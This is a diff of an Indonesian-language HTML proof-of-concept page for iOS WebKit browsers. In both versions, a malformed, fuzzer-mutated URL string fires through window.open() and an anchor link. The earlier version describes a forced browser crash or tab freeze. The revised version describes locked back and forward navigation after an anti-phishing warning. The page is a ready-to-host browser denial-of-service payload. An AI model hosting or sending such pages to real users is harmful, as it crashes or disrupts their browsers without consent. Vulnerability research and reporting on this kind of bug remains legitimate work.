@@ -3,39 +3,28 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>iOS WebKit URL Parser Test</title>
+    <title>WebKit URL Navigation State Test</title>
     <style>
         body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            background-color: #0b0f19;
-            color: #f1f5f9;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #0f172a;
+            color: #f8fafc;
             padding: 20px;
-            margin: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            box-sizing: border-box;
+            text-align: center;
         }
-        .card {
+        .container {
+            max-width: 100%;
+            margin: 20px auto;
             background-color: #1e293b;
             padding: 25px;
             border-radius: 16px;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.4);
+            box-shadow: 0 4px 20px rgba(0,0,0,0.3);
             border: 1px solid #334155;
-            width: 100%;
-            max-width: 500px;
-            text-align: center;
         }
         h2 {
             color: #f87171;
-            margin-top: 0;
             font-size: 22px;
-        }
-        p {
-            color: #94a3b8;
-            font-size: 14px;
-            line-height: 1.5;
+            margin-top: 0;
         }
         .payload-box {
             background-color: #020617;
@@ -43,75 +32,75 @@
             padding: 15px;
             border-radius: 8px;
             font-family: monospace;
-            font-size: 13px;
+            font-size: 14px;
             word-break: break-all;
             margin: 20px 0;
             border: 1px solid #334155;
-            user-select: all; /* Mempermudah copy di iPhone jika ditekan lama */
-            -webkit-user-select: all;
         }
         .btn {
+            display: block;
             background-color: #ef4444;
             color: white;
+            text-decoration: none;
             border: none;
             padding: 16px;
             font-size: 16px;
             font-weight: bold;
             border-radius: 12px;
             cursor: pointer;
-            width: 100%;
-            display: block;
             margin-bottom: 15px;
+            width: 100%;
             box-sizing: border-box;
             -webkit-tap-highlight-color: transparent;
         }
+        .btn-secondary {
+            background-color: #2563eb;
+        }
         .btn:active {
-            background-color: #b91c1c;
+            opacity: 0.8;
         }
-        .link-btn {
-            background-color: #3b82f6;
-            text-decoration: none;
-        }
-        .link-btn:active {
-            background-color: #1d4ed8;
-        }
-        .footer-note {
+        .instructions {
             text-align: left;
-            background-color: #0f172a;
-            padding: 12px;
+            font-size: 13px;
+            color: #94a3b8;
+            line-height: 1.6;
+            margin-top: 25px;
+            background: #0f172a;
+            padding: 15px;
             border-radius: 8px;
-            font-size: 12px;
-            color: #64748b;
-            margin-top: 20px;
         }
     </style>
 </head>
 <body>
 
-<div class="card">
-    <h2>⚠️ iOS WebKit Crash Test</h2>
-    <p>PoC pengujian ketahanan parser URL pada mesin WebKit iOS (Firefox / Safari) menggunakan payload mutasi fuzzer.</p>
+<div class="container">
+    <h2>⚠️ iOS WebKit URL State Test</h2>
+    <p>PoC untuk menguji ketahanan manajemen riwayat navigasi pada komponen WebKit iOS terhadap mutasi string URL.</p>
     
-    <!-- Box Payload murni untuk memudahkan jika ingin di-copy manual di iPhone -->
-    <div class="payload-box" id="payloadText">-%~-0/~%7%%%~-7a07%EF%BF%BD0.A|</div>
+    <div class="payload-box">
+        -%~-0/~%7%%%~-7a07%EF%BF%BD0.A|
+    </div>
 
-    <!-- Metode Pemicu 1: window.open via JavaScript -->
-    <button class="btn" onclick="executeTrigger()">Picu via window.open()</button>
+    <button class="btn" onclick="triggerNavigation()">Picu via window.open()</button>
     
-    <!-- Metode Pemicu 2: Navigasi link langsung menggunakan tag HTML <a> -->
-    <a class="btn link-btn" href="-%~-0/~%7%%%~-7a07%EF%BF%BD0.A|" target="_blank">Picu via Link (&lt;a&gt; tag)</a>
-
-    <div class="footer-note">
-        <strong>Indikator Valid:</strong><br>
-        Jika setelah diklik aplikasi Firefox iOS kamu mendadak menutup sendiri secara paksa (force close ke Home Screen) atau tab membeku total (*freeze*), berarti parser URL gagal menangani rangkaian karakter rusak ini.
+    <a class="btn btn-secondary" href="-%~-0/~%7%%%~-7a07%EF%BF%BD0.A|" target="_blank">Picu via Link (&lt;a&gt; tag)</a>
+    
+    <div class="instructions">
+        <strong>Langkah Validasi Masalah (Sesuai Hasil Pengujian):</strong>
+        <ol>
+            <li>Akses halaman ini melalui browser Firefox atau Safari di perangkat iOS.</li>
+            <li>Ketuk salah satu tombol pemicu di atas untuk mengarahkan navigasi ke string URL hasil mutasi.</li>
+            <li>Sistem keamanan anti-phishing iOS akan mencegat URL dan menampilkan layar peringatan merah pada objek <code>about:blank</code>.</li>
+            <li><strong>Indikator Malfungsi:</strong> Perhatikan bilah navigasi bawah browser. Tombol panah kiri (Back) dan kanan (Forward) akan terkunci dan berubah warna menjadi abu-abu (disabled), menandakan rusaknya sinkronisasi status riwayat navigasi (*history stack*).</li>
+        </ol>
     </div>
 </div>
 
 <script>
-    function executeTrigger() {
-        // Payload dipertahankan dalam format URL-encoded agar karakter rusaknya (%EF%BF%BD) terbaca utuh oleh browser
-        const targetPayload = "-%~-0/~%7%%%~-7a07%EF%BF%BD0.A|";
-        window.open(targetPayload, "_blank");
+    function triggerNavigation() {
+        // Mengirimkan payload ter-encode untuk menguji respon transisi state pada WebKit
+        const payload = "-%~-0/~%7%%%~-7a07%EF%BF%BD0.A|";
+        window.open(payload, "_blank");
     }
 </script>
 
